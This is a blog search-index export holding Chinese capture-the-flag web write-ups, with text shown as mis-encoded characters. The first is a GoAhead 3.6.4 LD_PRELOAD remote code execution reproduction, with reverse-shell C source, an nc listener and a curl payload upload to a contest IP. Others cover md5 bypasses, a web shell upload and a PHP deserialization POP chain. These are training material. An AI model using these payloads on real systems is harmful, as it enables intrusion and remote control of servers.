<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>æ¹–æ¹˜æ¯2019å¤ç°</title>
    <url>/2019/11/2019%E6%B9%96%E6%B9%98%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>æ‰“å¼€<a href="http://183.129.189.62:13900/index.html" target="_blank" rel="noopener">é“¾æ¥</a>,æ²¡ä»€ä¹ˆä¸œè¥¿ã€‚</p><p>æŸ¥çœ‹æºç </p><p><img src="/2019/11/2019æ¹–æ¹˜æ¯webå¤ç°/image-20191109213839151.png" alt="image-20191109213839151"></p><p>è¿›å…¥æç¤ºçš„é¡µé¢</p><p><img src="/2019/11/2019æ¹–æ¹˜æ¯webå¤ç°/image-20191109214035812.png" alt="image-20191109214035812"></p><p>å‘ç°æ˜¯GoAhead/3.6.4</p><p>ç™¾åº¦äº†ä¸€ä¸‹ï¼Œå‘ç° GoAhead 3.6.5ä¹‹å‰çš„ç‰ˆæœ¬ï¼ˆ2.5.0 â€“ 3.6.4ï¼‰ æœ‰ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œçš„æ¼æ´</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>GoAheadåœ¨æ¥æ”¶åˆ°è¯·æ±‚åï¼Œå°†ä¼šä»URLå‚æ•°ä¸­å–å‡ºé”®å’Œå€¼æ³¨å†Œè¿›CGIç¨‹åºçš„ç¯å¢ƒå˜é‡ï¼Œä¸”åªè¿‡æ»¤äº†REMOTE_HOSTå’ŒHTTP_AUTHORIZATIONã€‚æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ç¯å¢ƒå˜é‡ï¼Œå°±æœ‰å¾ˆå¤šæ”»å‡»æ–¹å¼ã€‚æ¯”å¦‚åœ¨Linuxä¸­ï¼ŒLD_å¼€å¤´çš„ç¯å¢ƒå˜é‡å’ŒåŠ¨æ€é“¾æ¥åº“æœ‰å…³ï¼Œå¦‚LD_PRELOADä¸­æŒ‡å®šçš„åŠ¨æ€é“¾æ¥åº“ï¼Œå°†ä¼šè¢«è‡ªåŠ¨åŠ è½½ï¼›LD_LIBRARY_PATHæŒ‡å®šçš„è·¯å¾„ï¼Œç¨‹åºä¼šå»å…¶ä¸­å¯»æ‰¾åŠ¨æ€é“¾æ¥åº“ã€‚</p><a id="more"></a>







<p>æˆ‘ä»¬å¯ä»¥æŒ‡å®šLD_PRELOAD=/proc/self/fd/0ï¼Œå› ä¸º/proc/self/fd/0æ˜¯æ ‡å‡†è¾“å…¥ï¼Œè€Œåœ¨CGIç¨‹åºä¸­ï¼ŒPOSTæ•°æ®æµå³ä¸ºæ ‡å‡†è¾“å…¥æµã€‚æˆ‘ä»¬ç¼–è¯‘ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œå°†å…¶æ”¾åœ¨POST Bodyä¸­ï¼Œå‘é€ç»™<a href="https://link.jianshu.com?t=http%3A%2F%2Ftarget%2Fcgi-bin%2Findex%3FLD_PRELOAD%3D%2Fproc%2Fself%2Ffd%2F0" target="_blank" rel="noopener">http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0</a>ï¼ŒCGIå°±ä¼šåŠ è½½æˆ‘ä»¬å‘é€çš„åŠ¨æ€é“¾æ¥åº“ï¼Œé€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p>
<h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>æ¼æ´äº§ç”Ÿäºgoahead/src/cgi.c:cgiHandlerä¸­ï¼Œç¨‹åºéå†äº†ç”¨æˆ·è®¿é—®æ—¶æ‰€å¸¦çš„å‚æ•°ï¼ŒéªŒè¯å¦‚æœå‚æ•°ä¸ä¸ºREMOTE_HOSTæˆ–HTTP_AUTHORIZATIONï¼Œåˆ™å°†å…¶å­˜å‚¨è‡³envpæ•°ç»„ã€‚<br> è¯¥æ•°ç»„å°†ä½œä¸ºæ¥ä¸‹æ¥cgiè°ƒç”¨çš„ç¯å¢ƒå˜é‡ã€‚å¯ä»¥çœ‹å‡ºæ­£æ˜¯è¿™é‡Œå¯¹äºå‚æ•°çš„è¿‡æ»¤ä¸å…¨ï¼Œå¯¼è‡´äº†ç”¨æˆ·å¯ä»¥ä¿®æ”¹CGIç¨‹åºçš„LD_PRELOADç¯å¢ƒå˜é‡,è‡´ä½¿æ¼æ´å­˜åœ¨ã€‚</p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ç¼–å†™payload.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">attacker_addr.sin_family = AF_INET;</span><br><span class="line">attacker_addr.sin_port = htons(<span class="number">1234</span>);</span><br><span class="line">attacker_addr.sin_addr.s_addr = inet_addr(<span class="string">"ipåœ°å€"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">connect</span>(sock, (struct sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">dup2(sock, <span class="number">0</span>);</span><br><span class="line">dup2(sock, <span class="number">1</span>);</span><br><span class="line">dup2(sock, <span class="number">2</span>);</span><br><span class="line">execve(<span class="string">"/bin/sh"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘åŠ¨æ€åº“(æ³¨æ„å’ŒæœåŠ¡å™¨ç¯å¢ƒç›¸ä¼¼)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC ./payload.c -o payload.so</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/2019æ¹–æ¹˜æ¯webå¤ç°/image-20191109223215495.png" alt="image-20191109223215495"></p>
<p>ä¼šæŠ¥é”™ï¼Œä½†ä¸å½±å“ä½¿ç”¨</p>
<p>æœåŠ¡å™¨å…ˆç›‘å¬1234ç«¯å£</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/2019æ¹–æ¹˜æ¯webå¤ç°/image-20191109222241231.png" alt="image-20191109222241231"></p>
<p>ç„¶åæ‰§è¡Œpayload</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X POST --data-binary @payload.so http://183.129.189.62:13900/cgi-bin/index?LD_PRELOAD\=/proc/self/fd/0 -i | head</span><br></pre></td></tr></table></figure>

<p>æœåŠ¡é”™è¯¯å°±å¤šè¿è¡Œå‡ æ¬¡</p>
<p><img src="/2019/11/2019æ¹–æ¹˜æ¯webå¤ç°/image-20191109222659969.png" alt="image-20191109222659969"></p>
<p>å¾—åˆ°flag</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>å¤ç°</tag>
      </tags>
  </entry>
  <entry>
    <title>2020åŒ—é‚®æ ¡èµ›</title>
    <url>/2020/03/2020%E5%8C%97%E9%82%AE%E6%A0%A1%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Ez-bypass"><a href="#1-Ez-bypass" class="headerlink" title="1.Ez_bypass"></a>1.Ez_bypass</h3><p>æ‰“å¼€ç½‘é¡µç›´æ¥æœ‰æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">                &#123;</span><br><span class="line">                    $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">                    <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                                &#123;   <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                                    highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                                    <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>


<p>ç¬¬ä¸€å±‚md5ç»•è¿‡å¯ä»¥ç”¨æ•°ç»„æˆ–è€…<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">md5ç¢°æ’</a>,ç¬¬äºŒå±‚å¼±ç±»å‹æ¯”è¾ƒç›´æ¥åœ¨1234567åé¢åŠ ä¸ªéæ•°å­—å­—ç¬¦å°±è¡Œ</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327185855883.png" alt="image-20200327185855883"></p>
<p>æˆ‘è¿™åŠ äº†ä¸ªç©ºæ ¼(é‚£ä¸ª0å¯ä»¥æ— è§†äº† -_-!)</p>
<h3 id="2-PYWebsite"><a href="#2-PYWebsite" class="headerlink" title="2.PYWebsite"></a>2.PYWebsite</h3><p>æ‰“å¼€ç½‘ç«™èŠ±é‡Œèƒ¡å“¨çš„ï¼Œç›´æ¥çœ‹æºç </p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327205601093.png" alt="image-20200327205601093"></p>
<p>ç›´æ¥çœ‹flag.phpé¡µé¢</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327205642253.png" alt="image-20200327205642253"></p>
<p>æ ¹æ®æç¤ºåº”è¯¥æ˜¯æ”¹XFFå¤´</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327205656797.png" alt="image-20200327205656797"></p>
<h3 id="3-ä½ ä¼ ä½ ğŸå‘¢"><a href="#3-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="3.ä½ ä¼ ä½ ğŸå‘¢"></a>3.ä½ ä¼ ä½ ğŸå‘¢</h3><p>å…ˆä¸Šä¼ .htaccessï¼Œæ–‡ä»¶å†…å®¹ï¼š SetHandler application/x-httpd-php </p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327202846073.png" alt="image-20200327202846073"></p>
<p>æ¥ç€ä¸Šä¼ é©¬</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327202924100.png" alt="image-20200327202924100"></p>
<p>è¿™ä¸ªé©¬æŒ‚äº†ä»£ç†æ‰è¿ä¸Š åäº†</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327202736128.png" alt="image-20200327202736128"></p>
<h3 id="4-Ezpop"><a href="#4-Ezpop" class="headerlink" title="4.Ezpop"></a>4.Ezpop</h3><p>ç›´æ¥æœ‰æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¸¸è§çš„é­”æœ¯æ–¹æ³•</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">__construct</span>()ï¼Œç±»çš„æ„é€ å‡½æ•°ï¼Œå½“å¯¹è±¡åˆ›å»ºæ—¶ä¼šè‡ªåŠ¨è°ƒç”¨(ä½†åœ¨unserialize()æ—¶æ˜¯ä¸ä¼šè‡ªåŠ¨è°ƒç”¨çš„)ã€‚</span><br><span class="line"><span class="selector-tag">__wakeup</span>() <span class="comment">//ä½¿ç”¨unserializeæ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__sleep</span>() <span class="comment">//ä½¿ç”¨serializeæ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__destruct</span>() <span class="comment">//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__call</span>() <span class="comment">//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__callStatic</span>() <span class="comment">//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__get</span>() <span class="comment">//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span></span><br><span class="line"><span class="selector-tag">__set</span>() <span class="comment">//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span></span><br><span class="line"><span class="selector-tag">__isset</span>() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__unset</span>() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__toString</span>() <span class="comment">//æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__invoke</span>() <span class="comment">//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></span><br></pre></td></tr></table></figure>

<p>__toString è§¦å‘çš„æ¡ä»¶æ¯”è¾ƒå¤š</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">(<span class="number">1</span>)echo ($obj) / print($obj) æ‰“å°æ—¶ä¼šè§¦å‘</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œ==æ¯”è¾ƒæ—¶ï¼ˆPHPè¿›è¡Œ==æ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼‰</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–SQLè¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶</span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡phpå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚ strlen()ã€addslashes()æ—¶</span><br><span class="line"></span><br><span class="line">(<span class="number">7</span>)åœ¨in_array()æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰toStringè¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™toStringä¼šè¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">(<span class="number">8</span>)ååºåˆ—åŒ–çš„å¯¹è±¡ä½œä¸º class_exists() çš„å‚æ•°çš„æ—¶å€™</span><br></pre></td></tr></table></figure>

<p>å…³é”®åœ¨<code>Modifier</code>ç±»ï¼Œå¦‚æœ$varä¸ºä¼ªåè®®é‚£ä¹ˆå¯è¯»flag.phpã€‚è¦è§¦å‘<code>Modifierçš„ __invoke()</code> å°±å¿…é¡»è§¦å‘<code>Testçš„__get()</code> ,è¦è§¦å‘<code>Testçš„__get()</code> å°±å¿…é¡»è®¿é—®<code>Testä¸­ä¸€ä¸ªä¸èƒ½è®¿é—®çš„ç±»æˆå‘˜</code> ã€‚è€Œåœ¨<code>Show</code> ä¸­çš„<code>__toSting</code> æ–¹æ³•<code>$this-&gt;str-&gt;source</code> æ˜æ˜¾æ˜¯ä¸èƒ½è®¿é—®çš„ã€‚æ‰€ä»¥æ„é€ å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var= <span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source-&gt;str =<span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> Modifier();</span><br><span class="line"></span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span>(urlencode($b));</span><br></pre></td></tr></table></figure>

<h3 id="5-å¥—å¨ƒ"><a href="#5-å¥—å¨ƒ" class="headerlink" title="5.å¥—å¨ƒ"></a>5.å¥—å¨ƒ</h3><p>ç¬¬ä¸€å±‚</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200328143848747.png" alt="image-20200328143848747"></p>
<p>è¿™é‡Œç¬¬ä¸€ä¸ªä¸»è¦æ˜¯åŒ¹é…äº†<code>_</code>ï¼Œå› ä¸º$_SERVER[â€˜QUERY_STRINGâ€™]ä¸ä¼šurldecodeæ‰€ä»¥ä¸€èˆ¬å¥—è·¯æ˜¯å¯ä»¥URLç¼–ç ï¼Œä½†æ˜¯æœ¬é¢˜ç›®banæ‰äº†<code>_</code>çš„ç¼–ç å€¼<code>%5f</code> ç»•è¿‡æ–¹æ³•ï¼š</p>
<ol>
<li>%5F</li>
<li>b.u.p.tï¼ˆç‚¹ä»£æ›¿_ï¼‰</li>
<li>b u p tï¼ˆç©ºæ ¼ä»£æ›¿_ï¼‰</li>
</ol>
<p>ç¬¬äºŒä¸ªç”¨æ¢è¡Œç¬¦%0aç»•è¿‡</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200328143918754.png" alt="image-20200328143918754"></p>
<p>è®¿é—®secrettw.phpæ²¡å•¥ç‰¹åˆ«çš„å°±æŠ“åŒ…çœ‹äº†ä¸‹</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200328144148256.png" alt="image-20200328144148256"></p>
<p>æ”¾åˆ°æ§åˆ¶å°è·‘äº†ä¸€ä¸‹</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200328144220283.png" alt="image-20200328144220283"></p>
<p>æœ‰äº†æç¤ºå°±å¥½åŠï¼Œä½†è¦æ³¨æ„å› ä¸ºä¹‹å‰æ˜¯æŠ“çš„GETåŒ…æ‰€ä»¥headersè¦åŠ ä¸Šcontent-typeè¿™ä¸ªå­—æ®µæˆ–è€…ç›´æ¥ç”¨Hackbar</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">getè¯·æ±‚çš„headersä¸­æ²¡æœ‰content-<span class="keyword">type</span>è¿™ä¸ªå­—æ®µï¼Œpost çš„ content-<span class="keyword">type</span> æœ‰ä¸¤ç§ ï¼š</span><br><span class="line"></span><br><span class="line">application/x-www-<span class="keyword">form</span>-urlencoded </span><br><span class="line">è¿™ç§å°±æ˜¯ä¸€èˆ¬çš„æ–‡æœ¬è¡¨å•</span><br><span class="line">multipart/<span class="keyword">form</span>-<span class="keyword">data</span> </span><br><span class="line">æ–‡ä»¶è¡¨å•çš„ä¼ è¾“</span><br></pre></td></tr></table></figure>

<p>POST Merakåä¼šæœ‰æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Flag is here~But how to get it? <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

